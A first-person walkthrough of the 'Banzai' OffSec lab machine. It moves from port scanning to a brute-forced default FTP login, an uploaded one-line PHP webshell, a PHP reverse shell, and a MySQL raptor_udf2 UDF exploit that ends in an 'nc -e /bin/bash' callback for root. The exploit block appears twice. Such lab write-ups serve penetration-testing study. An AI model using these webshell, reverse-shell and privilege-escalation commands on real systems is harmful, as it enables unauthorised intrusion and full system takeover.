Banzai

Target IP: 192.168.105.56
Challenge Description: You should be careful around raptors -- they are dangerous!

Reconnaissance


Running a TCP port scan using the command sudo nmap -sS 192.168.105.56 -p- returns the result shown in the image above. There are six TCP ports open on the target machine. Time to perform further scans to identify the applications.


Running an aggressive TCP port scan using the command sudo nmap -sV -A 192.168.105.56 -p 20,21,22,25,5432,8080,8295 returns the result shown in the image above. I notice the FTP-data port 20 is closed, but the FTP-control on port 21 is open. The FTP application name & version is vsftpd 3.0.3. The SSH application on port 22 is OpenSSH 7.4p1. The SMTP is using Postfix smtpd on port 25. Port 5432 is serving PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.19, as the scan isn't able to identify the version exactly. And finally, the higher ports 8080 and 8295 are serving web applications. The backend server is using Apache/2.4.25. I also notice the hostname is banzai.offseclabs.com. I will need to insert this inside my /etc/hosts file before enumeration.


I inserted the hostname inside my /etc/hosts file. I performed a directory search using multiple wordlists, but I didn't find anything useful.

Enumeration

Port 21: FTP

The FTP application does not allow anonymous login. When bruteforcing using the default credentials using the command hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt ftp://banzai.offseclabs.com, I got a hit as shown in the image above. The credentials admin:admin allows login.


After logging into the FTP application as the user admin, I had access to the FTP share. This share seems to be sharing some sort of web application project. I dug around the different directories, but I didn't find anything useful. Since the account I compromised is admin, can I upload files? Also, I had to use the command passive before running any commands such as getting the directory listing.


I created a file called test.txt on my machine. This file contained the text hi. Then I ran the command pwd to check the working directory for this application, and it seems to be at /. Hmmm. Then using the command put test.txt, I managed to successfully upload the test.txt file as shown in the image above. Since there are two web applications on the target machine: one on port 8080, and another one on port 8295. Can I directly access the uploaded file using the web application?


I was unable to access the uploaded file using the web application on port 8080. However, I got a hit using the other web application on port 8295 as shown in the image above. I was able to access my file over at http://banzai.offseclabs.com:8295/test.txt. Before performing any attacks such as uploading PHP files, I wish to enumerate further.

Port 8295: HTTP

The webpage shown in the image above is returned for this web application on port 8295. I viewed the source-code to identify any developer comments, but I didn't find anything useful. I also checked for any interesting hyperlinks, but there wasn't anything useful. I performed a directory search using the command feroxbuster -u http://banzai.offseclabs.com:8295 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip,jpg -d 4 --scan-dir-listings, but that didn't result in anything interesting. From the result, I did notice any uploaded files using the FTP application is directly accessible at the web root. The vulnerability lies here: default FTP credentials, and default web root for any uploaded files using FTP. A possible attack vector is by uploading a malicious PHP file using the FTP, and using the uploaded malicious file (e.g. a PHP webshell) to perform Remote Code Execution (RCE).

Exploitation

Exploitation: PHP Webshell Upload


On my machine, I ran the command echo '<?php system($_GET["cmd"]); ?>' > shell.php first. This puts the simple PHP webshell inside a file called shell.php. And then I logged into the FTP application on port 21 using the credentials admin:admin. I entered the command passive to disable the hanging, and put shell.php to upload my simple PHP webshell.


And then making calls to the PHP webshell using cURL leads to success. Now I can perform Remote Command Execution (RCE) using my simple uploaded PHP webshell, as shown in the image above. Time to obtain a reverse shell connection now.


I started a listener on my machine at port 8443. When I tried to obtain a reverse shell connection on ports other than 8295, I had no luck. I started a listener on my machine at port 8295. And then using the PHP webshell, I issued the URL encoded PHP reverse shell command php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.206%22%2C8295%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. And instantly, I got a hit as shown in the image above. Now I have access on the target machine as the user www-data.

Privilege Escalation & Flags

Vertical Privilege Escalation: User www-data to User root via MySQL UDF Exploit

After obtaining a shell access on the target machine, I checked for any interestign files but I didn't find anything. However, going one directory below (/var/www/) does contain the file config.php. This file contains the database credentials root:EscalateRaftHubris123, as shown in the image above. This database by the name main sounds interesting. If the application is running MySQL, I can use these credentials to gain access to the database application.


Using the credentials root:EscalateRaftHubris123, I gained access to the MySQL database application. But I didn't find anything useful. I enumerated further to access the PostgreSQL application, but I had no luck. Hitting a stuck point, I decided to check the MySQL application further.


I ran the command status to check the application version. The application version is 5.7.30. I checked for any vulnerabiliites and I came across the following webpage:

By the looks of it, it is vulnerable. This exploit is accessible from here. This technical article explains how to run the exploit. I just decided to follow the steps. These steps include the compiling process, setting up the table, loading the malicious shared object, etc. After downloading the exploit, I ran the following commands:

// Compile the exploit
// Exploit is downloaded at /tmp
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

// Copy the shared object to the plugin directory
cp raptor_udf2.so /usr/lib/mysql/plugin/

// Start MySQL
mysql -u root -p'EscalateRaftHubris123'

// Create
use mysql;
create table pwned(line blob);
insert into pwned values(load_file('/tmp/raptor_udf2.so'));
select * from pwned into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;

// Start a listener on my machine at port 21 then start the payload
select do_system('nc 192.168.45.206 21 -e /bin/bash');
// Compile the exploit
// Exploit is downloaded at /tmp
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

// Copy the shared object to the plugin directory
cp raptor_udf2.so /usr/lib/mysql/plugin/

// Start MySQL
mysql -u root -p'EscalateRaftHubris123'

// Create
use mysql;
create table pwned(line blob);
insert into pwned values(load_file('/tmp/raptor_udf2.so'));
select * from pwned into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;

// Start a listener on my machine at port 21 then start the payload
select do_system('nc 192.168.45.206 21 -e /bin/bash');


And after completing the previous steps, I obtained a reverse shell connection on my machine at port 21. Now I have a root level access. The two flags are also shown in the picture above.
